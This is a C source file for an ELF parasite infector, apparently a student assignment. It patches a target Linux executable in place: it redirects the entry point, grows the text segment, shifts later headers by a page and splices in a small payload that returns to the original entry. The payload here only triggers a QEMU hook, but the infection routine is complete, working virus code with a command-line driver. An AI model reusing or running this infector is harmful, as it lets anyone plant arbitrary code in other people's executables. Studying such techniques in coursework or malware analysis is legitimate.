
/*
ELF infector source file
Student:
Student ID:
Class:
*/
 
#include <stdio.h>
#include <stdlib.h>
#include <elf.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <string.h>
#include <unistd.h>
 
//Define PAGESIZE,default 4K byte
 
# define PAGESIZE 4096
 
//Parasite Virus Code.The code is copied from Internet.
/********************************************************
#define IA32_HOOK_OPCODE    ".byte 0x0f,0x3c"
#define IA32_HOOK_START     1 

static inline void __start_qemu_hook(void)
{
    //mov    $0x1,%eax
    __asm__ __volatile__ (IA32_HOOK_OPCODE "\n" 
			  : 
			  : "a"(IA32_HOOK_START)
              );
}
*//////////////////////////////////////////////////////
//char Virus[ ] ={/*Binary code for test*/} ;
//0xb8 0x01 0x00 0x00 0x00 0x0f 0x3c    -> __start_qemu_hook()
//0xbd 0x00 0x00 0x00     -> mov $0x00000000,%ebp
//0xff 0xe5               -> dmp %ebp
char Virus[ ] ={0xb8,0x01,0x00,0x00,0x00,0x0f,0x3c,0xbd,0x00,0x00,0x00,0x00,0xff,0xe5} ;
 
 
int infect( char *ElfFile) ;
//The size of Virus Code
int VirusSize= sizeof(Virus) ;
 
//int jmppoint=/*Jump point of binary code of Virus*/;
int jmppoint=8;
 
 
//Infector Function
 
int infect( char * ElfFile)
{
    int result= 0;
    int Re;
    int FileD;
    int TmpD;
    int OldEntry;
    int OldShoff;
    int OldPhsize;
    int i= 0;
    int insertsectionflag = 0; 
  
    Elf64_Ehdr elfh;
    Elf64_Phdr Phdr;
    Elf64_Shdr Shdr;
    
    //Open ELF file and read the elf header part to &elfh
 
    FileD= open ( ElfFile, O_RDWR) ;
    read ( FileD, & elfh, sizeof ( elfh) ) ;
    if ((strncmp( elfh.e_ident, ELFMAG, SELFMAG)) != 0)
        exit ( 0) ;
 
    //Old entry of original elf file
    OldEntry= elfh.e_entry;

    //Old section header offset of elf file
    OldShoff= elfh.e_shoff;
    
    //modify the Virus code line"movl "Oldentry",%eax" to jump to old entry
 
    //after the Virus code excuted
 
    *(int *) &Virus[ jmppoint ] = OldEntry;
    
    //Increase e_shoff by PAGESIZE in the ELF header
    elfh.e_shoff += PAGESIZE;
        
    //if Virus Size is too large
    if ( VirusSize > ( PAGESIZE- ( elfh. e_entry% PAGESIZE) ) ){
    		   exit ( 0) ;
    }
    
    int Noff= 0;
    //The loop of read and modify program header
 
    for ( i= 0; i< elfh.e_phnum; i++ )
    {
        
        //seek and read to &Phdr
        lseek( FileD, elfh. e_phoff+ i* elfh.e_phentsize, SEEK_SET ) ;
        read ( FileD, &Phdr, sizeof( Phdr) ) ;

        if ( Noff)
        {
            //For each phdr who's segment is after the insertion (text segment)
 
            //increase p_offset by PAGESIZE                
            Phdr.p_offset += PAGESIZE;
 
            //write back
            lseek( FileD, elfh.e_phoff+ i* elfh.e_phentsize, SEEK_SET ) ;
            write ( FileD, & Phdr, sizeof ( Phdr) ) ;
        }
 
        else if ( PT_LOAD == Phdr.p_type && Phdr.p_offset== 0)
        {
            if ( Phdr.p_filesz != Phdr.p_memsz){
             	   exit ( 0) ;
            }
            // Locate the text segment program header
 
            //Modify the entry point of the ELF header to point to the new
 
            //code (p_vaddr + p_filesz)
 
            //elfh.e_entry = Phdr.p_vaddr + Phdr.p_filesz+ 4;
            elfh.e_entry = Phdr.p_vaddr + Phdr.p_filesz;
            lseek( FileD, 0, SEEK_SET ) ;
            
            //Write back the new elf header
 
            write( FileD, &elfh, sizeof(elfh)) ;
            OldPhsize= Phdr.p_filesz;
            Noff= Phdr.p_offset+ Phdr.p_filesz;
            
            //Increase p_filesz by account for the new code (parasite)
 
            Phdr. p_filesz += VirusSize;
            
            //Increase p_memsz to account for the new code (parasite)    
 
            Phdr. p_memsz += VirusSize;
            
            //write back the program header
            lseek( FileD, elfh.e_phoff+ i* elfh.e_phentsize, SEEK_SET ) ;
            write ( FileD, & Phdr, sizeof ( Phdr) ) ;
        }
    }
    lseek( FileD, OldShoff, SEEK_SET ) ;


    //The loop of read and modify the section header
    for ( i= 0; i< elfh.e_shnum; i++ )
    {
        lseek(FileD, i* sizeof ( Shdr) + OldShoff, SEEK_SET ) ;
        Re= read ( FileD, &Shdr, sizeof ( Shdr) ) ;
       // printf("--- %x\n",i);
       // printf("[p2]%x %x %x %x\n",i,Shdr.sh_offset,Shdr.sh_size,Noff);     
        if (Shdr.sh_offset + Shdr.sh_size == Noff){
            //For the last shdr in the text segment
            //increase sh_size by the virus size    
            Shdr.sh_size += VirusSize;
            //printf("[info_section]%x %x %x\n",i,Shdr.sh_offset,Shdr.sh_size);     
            insertsectionflag = 1; 
        }
	if(insertsectionflag){

            Shdr.sh_offset += PAGESIZE;
	}
        //Write Back
        lseek( FileD, OldShoff+ i* sizeof ( Shdr) , SEEK_SET ) ;
        write ( FileD, &Shdr, sizeof ( Shdr) ) ;
	
    }


    //To get the file size FileStat.st_size

    struct stat FileStat;
    fstat( FileD, & FileStat) ;
    printf("oldphsize=0x%x\n",OldPhsize); 
    printf("Noff=0x%x\n",Noff); 
    char *Data= NULL ;
    Data= ( char *) malloc(FileStat.st_size - Noff) ;
 
    lseek( FileD, Noff, SEEK_SET ) ;
    read ( FileD, Data, FileStat.st_size - Noff) ;
 
    //Insert the Virus Code to the elf file
    lseek( FileD, Noff, SEEK_SET ) ;
    write ( FileD, Virus, sizeof ( Virus) ) ;
    char tmp[ PAGESIZE] = { 0} ;
    
    //Pad to PAGESIZE
 
    memset ( tmp, PAGESIZE- VirusSize, 0) ;
    write ( FileD, tmp, PAGESIZE- VirusSize) ;
 
    write ( FileD, Data, FileStat.st_size- Noff) ;
    result= 1;
 
    free(Data) ;
 
    return result;             
        
}
 
//Just for test
 
int main( int argc, char **argv)
{
      //How to use it
 
      if ( argc!=2)
      {
        printf ( "Usage : infect <ELF filename>\n" ) ;
                exit ( 0) ;
      }
    
      int test = infect( argv[ 1] ) ;
      if ( test != 1)
      {
        exit ( 0) ;
      }
       return 0;
}
